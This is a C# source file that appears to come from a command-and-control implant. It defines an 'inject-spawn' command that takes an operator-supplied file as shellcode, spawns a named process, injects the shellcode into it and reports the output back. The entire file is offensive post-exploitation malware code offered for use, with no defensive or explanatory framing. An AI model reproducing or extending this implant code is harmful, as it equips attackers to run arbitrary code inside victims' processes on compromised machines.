using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SpawnInjectCommand : AgentCommand
    {
        public override string Name => "inject-spawn";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {

            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var fileContent = file.GetFileContent();

            var shellcode = fileContent;

            var injectRes = Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[0]);
            if (!injectRes.Succeed)
                context.Result.Result += $"Injection failed : {injectRes.Error}";
            else
            {
                context.Result.Result += $"Injection succeed!" + Environment.NewLine;
                if (!string.IsNullOrEmpty(injectRes.Output))
                    context.Result.Result += injectRes.Output;
            }
        }
    }
}
